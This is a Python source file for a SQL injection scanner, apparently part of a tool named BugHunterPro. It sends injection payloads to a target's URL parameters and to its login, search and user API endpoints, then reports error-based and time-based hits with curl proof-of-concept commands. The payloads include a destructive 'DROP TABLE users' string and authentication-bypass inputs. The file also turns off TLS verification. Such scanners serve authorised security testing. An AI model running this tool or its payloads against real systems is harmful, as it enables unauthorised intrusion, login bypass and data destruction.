#!/usr/bin/env python3
"""SQL Injection Scanner"""
import requests
import time
import re

class SQLiScanner:
    def __init__(self, target, scan_id, socketio, log_fn, finding_fn):
        self.target = target.rstrip('/')
        self.scan_id = scan_id
        self.log = log_fn
        self.add_finding = finding_fn
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 BugHunterPro/2.0'})
        
        self.error_patterns = [
            r"you have an error in your sql syntax",
            r"warning: mysql",
            r"unclosed quotation mark",
            r"quoted string not properly terminated",
            r"sql syntax.*mysql",
            r"mysql_fetch_array\(\)",
            r"ora-[0-9]{5}",
            r"pg::syntaxerror",
            r"microsoft ole db provider for sql server",
            r"sqlite_error",
            r"sqlite3::query",
            r"syntax error.*line [0-9]",
            r"django.db.utils.operationalerror",
            r"psycopg2.errors",
        ]
        
        self.sqli_payloads = [
            "'",
            '"',
            "'--",
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 1=1#",
            "\" OR 1=1--",
            "') OR ('1'='1",
            "1; DROP TABLE users--",
            "1 AND 1=2 UNION SELECT 1,2,3--",
            "' UNION SELECT NULL--",
            "' AND SLEEP(3)--",   # Time-based
            "'; WAITFOR DELAY '0:0:3'--",  # MSSQL
        ]

    def run(self):
        self.log(self.scan_id, "🗄️ Testing SQL Injection...", 'info', 'sqli')
        
        # Find parameters
        params = self._find_params()
        
        for param_info in params[:20]:
            self._test_sqli(param_info)
        
        # Test API endpoints
        self._test_api_sqli()
        
        self.log(self.scan_id, "  ✅ SQLi scan complete", 'info', 'sqli')

    def _find_params(self):
        params = []
        try:
            r = self.session.get(self.target, timeout=8)
            urls = re.findall(r'href=["\']([^"\']*\?[^"\']+)["\']', r.text)
            from urllib.parse import urlparse, parse_qs, urljoin
            for url in urls[:15]:
                if not url.startswith('http'):
                    url = urljoin(self.target, url)
                parsed = urlparse(url)
                if parsed.query:
                    for param, values in parse_qs(parsed.query).items():
                        params.append({
                            'url': f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                            'param': param,
                            'value': values[0]
                        })
        except:
            pass
        
        # Default test params
        default_params = [
            {'url': self.target + '/api/search', 'param': 'q', 'value': 'test'},
            {'url': self.target + '/api/user', 'param': 'id', 'value': '1'},
            {'url': self.target + '/api/product', 'param': 'id', 'value': '1'},
        ]
        params.extend(default_params)
        return params

    def _test_sqli(self, param_info):
        url = param_info['url']
        param = param_info['param']
        
        baseline_time = self._get_baseline(url, param, param_info['value'])
        
        for payload in self.sqli_payloads:
            try:
                start = time.time()
                r = self.session.get(
                    url, 
                    params={param: payload},
                    timeout=10
                )
                elapsed = time.time() - start
                
                body = r.text.lower()
                
                # Error-based detection
                for pattern in self.error_patterns:
                    if re.search(pattern, body):
                        self.log(self.scan_id, 
                            f"  🚨 SQLi ERROR-BASED: {param}={payload[:30]}", 'critical', 'sqli')
                        self.add_finding(self.scan_id, {
                            'type': 'SQL Injection',
                            'subtype': 'Error-Based',
                            'severity': 'critical',
                            'target': url,
                            'parameter': param,
                            'description': f'SQL Injection via parameter "{param}" - error-based',
                            'evidence': f'Payload: {payload}\nSQL error pattern matched: {pattern}\nResponse snippet: {r.text[:300]}',
                            'cvss': 9.8,
                            'poc': f'curl -s "{url}?{param}={requests.utils.quote(payload)}"',
                            'remediation': 'Use parameterized queries (prepared statements). Never concatenate user input in SQL queries.',
                            'cwe': 'CWE-89'
                        })
                        return
                
                # Time-based detection
                if 'sleep' in payload.lower() or 'waitfor' in payload.lower():
                    if elapsed > baseline_time + 2.5:
                        self.log(self.scan_id,
                            f"  🚨 SQLi TIME-BASED: {param}={payload[:30]} ({elapsed:.1f}s delay)", 
                            'critical', 'sqli')
                        self.add_finding(self.scan_id, {
                            'type': 'SQL Injection',
                            'subtype': 'Time-Based Blind',
                            'severity': 'critical',
                            'target': url,
                            'parameter': param,
                            'description': f'Blind SQL Injection (time-based) in parameter "{param}"',
                            'evidence': f'Payload: {payload}\nResponse delay: {elapsed:.2f}s (baseline: {baseline_time:.2f}s)',
                            'cvss': 9.8,
                            'poc': f'curl -s --max-time 10 "{url}?{param}={requests.utils.quote(payload)}"',
                            'remediation': 'Use parameterized queries. Limit database user permissions.',
                            'cwe': 'CWE-89'
                        })
                        return
            except:
                pass

    def _get_baseline(self, url, param, value):
        times = []
        for _ in range(2):
            try:
                start = time.time()
                self.session.get(url, params={param: value}, timeout=5)
                times.append(time.time() - start)
            except:
                times.append(1.0)
        return sum(times) / len(times) if times else 1.0

    def _test_api_sqli(self):
        self.log(self.scan_id, "  🔌 Testing API endpoint SQLi...", 'info', 'sqli')
        
        api_endpoints = [
            f"{self.target}/api/login",
            f"{self.target}/api/search",
            f"{self.target}/api/users",
        ]
        
        login_payloads = [
            {"username": "admin'--", "password": "anything"},
            {"username": "' OR '1'='1'--", "password": "x"},
            {"email": "admin@example.com'--", "password": "x"},
        ]
        
        for endpoint in api_endpoints:
            for payload in login_payloads[:2]:
                try:
                    r = self.session.post(endpoint, json=payload, timeout=5)
                    body = r.text.lower()
                    for pattern in self.error_patterns[:5]:
                        if re.search(pattern, body):
                            self.add_finding(self.scan_id, {
                                'type': 'SQL Injection',
                                'subtype': 'Login Bypass',
                                'severity': 'critical',
                                'target': endpoint,
                                'description': 'SQL Injection in login endpoint - authentication bypass possible',
                                'evidence': f'Payload: {payload}\nSQL error in response: {r.text[:200]}',
                                'cvss': 9.8,
                                'poc': f'curl -X POST -H "Content-Type: application/json" -d \'{{"username":"admin\'\'--","password":"x"}}\' {endpoint}',
                                'cwe': 'CWE-89'
                            })
                except:
                    pass
